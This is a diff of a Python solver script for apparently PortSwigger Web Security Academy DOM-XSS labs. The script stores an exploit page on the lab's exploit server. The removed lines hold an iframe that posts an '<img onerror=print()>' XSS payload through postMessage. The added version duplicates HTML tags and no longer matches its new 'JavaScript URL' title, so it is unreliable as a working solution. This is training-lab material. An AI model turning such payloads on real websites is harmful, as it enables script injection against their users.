@@ -1,15 +1,16 @@
+# !/usr/bin/env python3
 
-#!/usr/bin/env python3
-
-from bs4 import BeautifulSoup
-import requests
 import sys
-import urllib3
 import time
+
+import requests
+import urllib3
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 url = 'https://0a5900da0410a033c0af4c18007f00a1.web-security-academy.net/'
+
 
 def find_exploitserver(text):
     soup = BeautifulSoup(text, 'html.parser')
@@ -29,16 +30,19 @@ def store_exploit(client, exploit_server):
             'responseBody': '''
 <html>
   <body>
-<iframe src="''' + url + '''/" onload="contentWindow.postMessage('<img src=1 onerror=print()>','*')">
-</iframe> width="100%" height="100%">
-</iframe>
+<html>
+<body>
+<iframe src="''' + url + '''" width="100%" height="100%" onload=print(1) ></iframe>
   </body>
 </html>
-''',
-            'formAction': 'STORE'}
+
+
+           ''', 'formAction': 'STORE'}
     return client.post(exploit_server, data=data).status_code == 200
+
+
 def main():
-    print('Lab#1 - DOM XSS using web messages')
+    print('Lab#2 - DOM XSS using web messages and a JavaScript URL')
 
     with requests.session() as client:
         client.verify = False
